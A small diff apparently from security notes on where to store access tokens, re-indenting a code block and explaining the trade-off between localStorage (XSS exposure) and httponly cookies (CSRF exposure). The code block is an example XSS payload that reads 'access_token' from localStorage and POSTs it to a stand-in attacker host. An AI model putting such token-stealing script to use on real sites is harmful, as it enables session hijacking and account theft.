@@ -47,10 +47,10 @@
       
       and the query is like this:
       ```
-// attacker JS running in victim's page
-const token = localStorage.getItem('access_token');        // attacker reads token
-// exfiltrate it
-fetch('https://attacker.example/steal', { method:'POST', body: token });
+        // attacker JS running in victim's page
+        const token = localStorage.getItem('access_token');        // attacker reads token
+        // exfiltrate it
+        fetch('https://attacker.example/steal', { method:'POST', body: token });
       ```
       
       - Store in httponly cookies makes it not vulnerable against XSS, but it is then vulnerable to CSRF attacks, unless you set samesite=lax or none with secure=True and CSRF token. Explanation:
